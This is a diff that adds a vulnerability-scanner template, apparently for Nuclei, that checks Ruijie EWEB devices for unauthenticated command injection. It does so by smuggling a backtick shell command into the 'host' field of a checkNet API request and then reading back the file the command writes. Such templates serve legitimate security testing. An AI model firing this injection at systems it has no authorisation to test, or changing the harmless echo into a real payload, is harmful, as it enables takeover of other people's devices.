@@ -1,0 +1,47 @@
+id: ruijie-eweb-auth-rce
+info:
+  name: Ruijie EWEB Auth Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Ruijie Ruiyi's vulnerability allows attackers to execute arbitrary code on the server, potentially compromising the entire web server.
+  tags: command-execution
+http:
+  - raw:
+      - |
+        POST /cgi-bin/luci/api/auth HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"method":"checkNet","params":{"host":"`echo {{random_hex_1}}> {{random_hex_2}}.txt`"}}
+    matchers-condition: and
+    extractors:
+      - type: regex
+        name: random_hex_2
+        part: body
+        internal: true
+        regex:
+          - "{{random_hex_2}}"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "false"
+  - raw:
+      - |
+        GET /cgi-bin/{{random_hex_2}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{random_hex_1}}"
+variables:
+  random_hex_1: "{{rand_hex(8)}}"
+  random_hex_2: "{{rand_hex(8)}}"
